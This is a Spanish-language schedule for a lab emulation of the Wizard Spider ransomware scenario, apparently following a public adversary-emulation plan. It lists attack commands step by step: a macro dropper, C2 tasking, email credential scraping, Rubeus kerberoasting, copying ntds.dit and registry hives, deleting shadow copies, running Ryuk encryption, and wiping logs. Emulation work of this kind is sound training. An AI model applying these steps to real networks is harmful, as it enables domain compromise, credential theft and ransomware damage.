---
title: Cronograma
date: 2025-05-01 00:00:00 -05:00
categories: [apt]
tags: [cronograma]
---

<!-- 
¡Entendido! Con una estimación de tiempo total de **aproximadamente 4 a 4.5 semanas (160-180 horas)** para el escenario 1 de Wizard Spider, considerando la complejidad, los imprevistos y la necesidad de documentación, vamos a redistribuir los 10 pasos a lo largo de 4 semanas.

Esto nos permitirá tener una planificación más holgada y realista, integrando el *buffer* de tiempo dentro de la duración de cada tarea. -->

---

## Cronograma Ajustado de Emulación de Adversario: Wizard Spider - Escenario 1 <!-- (4 Semanas) -->

Este cronograma está diseñado para el **Escenario 1 de Wizard Spider**, alineándose con los 10 pasos del plan oficial y distribuyendo las tareas. <!-- de manera más realista para un total de aproximadamente 160-180 horas de trabajo. -->

---
- [x] 📅 **Del 23 al 28 de junio de 2025**
<!-- ### Semana 1: Preparación, Acceso Inicial y Persistencia de Emotet (Total Estimado: 40 horas) -->

### Preparación, Acceso Inicial y Persistencia de Emotet

Esta semana se enfoca en establecer la infraestructura, lograr el acceso inicial y asegurar la persistencia del primer *malware* (Emotet).

<!-- * **Días 1-2: Configuración del Entorno de Emulación (16 horas)** -->
* **Configuración del Entorno de Emulación**
    * **Actividad 1.1: Diseño y Despliegue de la Infraestructura C2:** 

        - [x] Planificación detallada y configuración de los servidores C2 para Emotet (192.168.0.4:80 HTTP), incluyendo *listeners*, perfiles Malleable C2 y VPN/máquinas de salto. <!--(10 horas) -->

    * **Actividad 1.2: Preparación del Entorno Objetivo (Dorothy):** 
    
        - [x] Configuración de la máquina "Dorothy" (10.0.0.7), incluyendo la cuenta de usuario `judy@oz.local`, sistemas operativos, defensas simuladas y el pre-posicionamiento del documento `ChristmasCard.docm`. <!--(6 horas)-->

<!-- * **Días 3-4: Paso 1 - Initial Compromise (16 horas)** -->
* **Paso 1 - Initial Compromise**
    * **Actividad 1.3: Subir Documento Emotet-dropper:** 
    
        - [x] Uso de `smbclient` para colocar el `ChristmasCard.docm` en el escritorio de Dorothy. <!--(2 horas)-->

    * **Actividad 1.4: Iniciar Control Server:**
    
        - [x] `sudo ./controlServer` para activar el servidor C2. <!--(1 hora)-->

    * **Actividad 1.5: RDP a Dorothy:** 
    
        - [x] Conexión remota a 10.0.0.7 como `judy@oz.local`. <!--(1 hora)-->

    * **Actividad 1.6: Abrir Documento y Habilitar Macros:** 

        Abrir `ChristmasCard.docm` y habilitar macros, monitoreando la ejecución de la DLL de Emotet. <!--(8 horas - **incluye tiempo de solución de problemas/depuración si la ejecución inicial falla, o si hay que evadir alguna detección simulada.**)-->

        <!-- * **Actividad extra:**
            - revisar código de la macros
            - conceptos claros de enrutamiento, buscar el enrutamiento adecuado
                - verificar la red, que todos tengan continuidad (mejorar conocimientos de networking)
                - dos opciones:
                    - 1. ¿sostener un router virtual?, se necesita un 1GB y 1CPU, es adeacuado?
                    - 2. Buscar el enrutamiento adecuado, networking en virtual box, documentación
            - herramientas:
                - TCP dump
                - netcad
                - procmon
            - documentar -->


    * **Actividad 1.7: Confirmar Callback C2 y Documentación Inicial:** 
    
        Verificar la nueva sesión de Emotet en el control server y tomar capturas de pantalla/notas. <!--(4 horas)-->
    

<!-- * **Día 5: Paso 2 - Emotet Persistence (8 horas)** -->
* **Paso 2 - Emotet Persistence**
    * **Actividad 2.1: Establecer Persistencia del Registro:** Ejecutar `evalsC2client.py --set-task DOROTHY_DABB41A5 1` para añadir la clave de registro de persistencia (`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`). <!-- (8 horas - **incluye verificación exhaustiva de la persistencia y su resistencia a posibles reinicios simulados o acciones de defensa.**)-->

---
- [ ] 📅 **Del 30 de junio al 05 de julio de 2025**
<!-- ### Semana 2: Recolección de Credenciales y Movimiento Lateral Inicial (Total Estimado: 40 horas) -->

### Recolección de Credenciales y Movimiento Lateral Inicial

Fase de descubrimiento post-explotación, la recopilación de credenciales y el primer salto lateral.

<!-- * **Días 6-7: Paso 3 - Emotet Host Discovery and Credential Collection (16 horas)** -->
* **Paso 3 - Emotet Host Discovery and Credential Collection**
    * **Actividad 3.1: Enumerar Procesos Locales:** Ejecutar `evalsC2client.py --set-task DOROTHY_DABB41A5 2`. <!--(2 horas)-->

    * **Actividad 3.2: Descargar Outlook Scraper DLL:** Ejecutar `evalsC2client.py --set-task DOROTHY_DABB41A5 3` para obtener `Outlook.dll` del C2. <!--(4 horas - **considerando posibles problemas de descarga o detección.**)-->

    * **Actividad 3.3: Cargar Outlook Scraper DLL:** Ejecutar `evalsC2client.py --set-task DOROTHY_DABB41A5 4` para cargar la DLL en el espacio de memoria de Emotet. <!--(4 horas)-->

    * **Actividad 3.4: Scrapear Contenido de Email (Outlook):** Ejecutar `evalsC2client.py --set-task DOROTHY_DABB41A5 5` y `evalsC2client.py --set-task DOROTHY_DABB41A5 8` para extraer correos y contactos, buscando credenciales (especialmente `bill@oz.local`). <!--(6 horas - **incluye análisis de resultados y validación de credenciales.**)-->

<!-- * **Días 8-9: Paso 4 - Move Laterally Deploy TrickBot (16 horas)** -->
* **Paso 4 - Move Laterally Deploy TrickBot**
    * **Actividad 4.1: Desconectarse de RDP (Dorothy):** Cerrar la sesión RDP actual. <!--(1 hora)-->

    * **Actividad 4.2: RDP a Toto y Crear Share de Red:** Conectar a 10.0.0.8 como `bill@oz.local`, configurando un *drive* RDP montado con la carpeta TrickBot. <!--(4 horas - **incluye validación de la conexión y share.**)-->

    * **Actividad 4.3: Copiar TrickBot EXE a AppData:** Usar `copy \\tsclient\X\TrickBotClientExe.exe %AppData%\uxtheme.exe` en la nueva máquina. <!--(3 horas)-->

    * **Actividad 4.4: Ejecutar TrickBot EXE:** `cd %AppData%` y luego `uxtheme.exe` para iniciar TrickBot. <!--(5 horas - **incluye monitoreo de la nueva sesión de TrickBot en el C2 y resolución de problemas de ejecución.**)-->

    * **Actividad 4.5: Captura de Pantalla y Documentación:** Documentar la nueva sesión de TrickBot. <!--(3 horas)-->

<!-- * **Día 10: Paso 5 - TrickBot Discovery (8 horas)** -->
* **Paso 5 - TrickBot Discovery**
    * **Actividad 5.1: Ejecutar Comandos de Descubrimiento (TrickBot):** Desde el C2, ejecutar la serie de comandos `evalsC2client.py --set-task TrickBot-Implant` (`systeminfo`, `sc query`, `net user`, `ipconfig`, `netstat`, `net config workstation`, `nltest`, `whoami /groups`). <!--(8 horas - **incluye tiempo para analizar los resultados de la enumeración y planificar los siguientes pasos.**)-->

---
- [ ] 📅 **Del 07 al 12 de julio de 2025**
<!-- ### Semana 3: Escalada de Privilegios en DC y Exfiltración de AD (Total Estimado: 40 horas) -->

### Escalada de Privilegios en DC y Exfiltración de AD

Esta semana se concentra en la escalada de privilegios a nivel de dominio y la exfiltración de la base de datos del Directorio Activo.

<!-- * **Días 11-12: Paso 6 - Kerberoast the DC (16 horas)** -->
* **Paso 6 - Kerberoast the DC**
    * **Actividad 6.1: Obtener Rubeus.exe en TrickBot Implant:** `evalsC2client.py --set-task TrickBot-Implant "get-file rubeus.exe"`. <!-- (4 horas - **incluye solución de problemas de transferencia de archivos.**)-->

    * **Actividad 6.2: Realizar Kerberoasting:** `evalsC2client.py --set-task TrickBot-Implant "rubeus.exe kerberoast /domain:oz.local"` para obtener los hashes de credenciales del DC (especialmente `vfleming`). <!-- (12 horas - **incluye tiempo para asegurar la ejecución del comando, la recolección de los hashes y la simulación del *cracking* offline.**)-->

<!-- * **Días 13-14: Paso 7 - Lateral Movement to DC (16 horas)** -->
* **Paso 7 - Lateral Movement to DC**
    * **Actividad 7.1: Desconectarse de RDP (Toto):** Cerrar la sesión RDP actual. <!-- (1 hora)-->

    * **Actividad 7.2: RDP a Wizard (DC) y Descargar TrickBot Variant:** Conectar a 10.0.0.4 como `vfleming@oz.local` con un *drive* RDP montado, y usar `Invoke-WebRequest` para descargar el binario de TrickBot variante. <!-- (6 horas - **incluye validación del RDP con las nuevas credenciales y problemas de descarga.**)-->

    * **Actividad 7.3: Establecer Persistencia de Registro (Userinit):** Modificar la clave `HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit` para mantener la persistencia en el DC. <!-- (4 horas)-->

    * **Actividad 7.4: Enumerar Dominio con AdFind:** Ejecutar `adfind -f "(objectcategory=group)"` en el DC para una enumeración profunda. <!-- (5 horas - **incluye análisis de resultados y confirmación de privilegios de dominio.**)-->

<!-- * **Día 15: Paso 8 - Dump Active Directory Database (ntds.dit) (8 horas)** -->
* **Paso 8 - Dump Active Directory Database (ntds.dit)**
    * **Actividad 8.1: Crear Shadow Copy del Volumen (VSS):** Ejecutar `vssadmin.exe create shadow /for=C:` en el DC para obtener una copia de seguridad consistente de los archivos de AD. <!-- (3 horas)-->

    * **Actividad 8.2: Copiar NTDS.dit y Hives del Registro:** Usar `copy` para extraer `ntds.dit`, `SYSTEM` y otros hives del registro a través del *share* RDP montado. <!-- (5 horas - **incluye verificación de la integridad de los archivos copiados y simulación de su extracción segura.**)-->

---
- [ ] 📅 **Del 14 al 19 de julio de 2025**
<!-- ### Semana 4: Impacto del Ransomware y Post-Explotación (Total Estimado: 40 horas) -->

### Impacto del Ransomware y Post-Explotación

La última semana se dedica a las fases finales de la emulación, incluyendo la preparación del *ransomware*, el impacto y la limpieza/documentación final.

<!-- * **Días 16-17: Paso 9 - Ryuk Inhibit System Recovery (16 horas)** -->
* **Paso 9 - Ryuk Inhibit System Recovery**
    * **Actividad 9.1: Montar Share de Toto:** `net use Z: \\10.0.0.8\C$` desde el DC para el movimiento lateral del *ransomware*. <!--(3 horas)-->

    * **Actividad 9.2: Copiar y Ejecutar kill.bat:** `copy \\TSCLIENT\X\kill.bat C:\Users\Public\kill.bat` y ejecutar `C:\Users\Public\kill.bat` para detener servicios y deshabilitar copias de seguridad/restauración del sistema. <!--(7 horas - **incluye monitoreo de los servicios afectados y verificación.**)-->

    * **Actividad 9.3: Copiar y Ejecutar window.bat:** `copy \\TSCLIENT\X\window.bat C:\Users\Public\window.bat` y ejecutar `C:\Users\Public\window.bat` para eliminar *shadow copies* existentes.<!--(6 horas - **incluye verificación de la eliminación.**)-->

<!-- * **Días 18-19: Paso 10 - Ryuk Encryption for Impact (16 horas)** -->
* **Paso 10 - Ryuk Encryption for Impact**
    * **Actividad 10.1: Copiar Ryuk Executable:** `copy \\TSCLIENT\X\ryuk.exe C:\Users\Public\ryuk.exe` al DC. <!--(2 horas)-->

    * **Actividad 10.2: Preparación del Proceso Objetivo (notepad.exe):** Asegurarse de que `notepad.exe` esté disponible para la inyección. <!--(1 hora)-->

    * **Actividad 10.3: Ejecutar Ryuk para Cifrado:** `C:\Users\Public\ryuk.exe --encrypt --process-name notepad.exe` para simular el cifrado de archivos en el host local (DC) y en el *share* montado (Toto). <!--(10 horas - **esta es una fase crítica que puede requerir depuración y verificación de los resultados del cifrado.**)-->

    * **Actividad 10.4: Confirmar Cifrado:** `type` archivos cifrados local y remotamente para verificar el impacto.<!--(3 horas)-->

<!-- * **Día 20: Post-Emulación: Limpieza y Documentación Final (8 horas)** -->
* **Post-Emulación: Limpieza y Documentación Final**
    * **Actividad 10.5: Eliminación de Rastros:** Borrado de *logs*, archivos temporales, herramientas y otras evidencias de la actividad en todos los sistemas comprometidos y la infraestructura de ataque. <!--(4 horas)-->

    * **Actividad 10.6: Eliminación de Persistencia:** Remover todos los *backdoors* y mecanismos de persistencia. <!--(2 horas)-->

    * **Actividad 10.7: Preparación y Revisión del Informe Final:** Consolidación de toda la documentación recopilada durante las semanas y elaboración del informe final de emulación. <!--(2 horas - **Se asume que la mayor parte de la documentación se realizó continuamente durante las tareas, este es un tiempo para consolidación y revisión final.**)-->

---

<!-- ### Consideraciones Clave para el Cronograma de 4 Semanas:

* **Buffer Integrado:** Las horas asignadas a cada paso ya incluyen un margen para la resolución de problemas, la depuración y la verificación de resultados. Esto hace que el cronograma sea más robusto.

* **Documentación Continua:** Se enfatiza la importancia de la documentación constante a lo largo de todo el ejercicio.

* **Flexibilidad:** Aunque este cronograma es más detallado, la emulación es un proceso dinámico. Permite flexibilidad para ajustar los tiempos o reevaluar enfoques si las defensas reaccionan de manera inesperada o si se descubren nuevas vías.

* **Naturaleza de la Simulación:** El tiempo también contempla la posible necesidad de restablecer el entorno o verificar la efectividad de las simulaciones de defensa.

Este cronograma proporciona una hoja de ruta más completa y realista para la emulación del escenario de Wizard Spider, permitiendo un enfoque más metodológico y robusto.

CUMPLIR CON LO DETALLADO !!! 
--- -->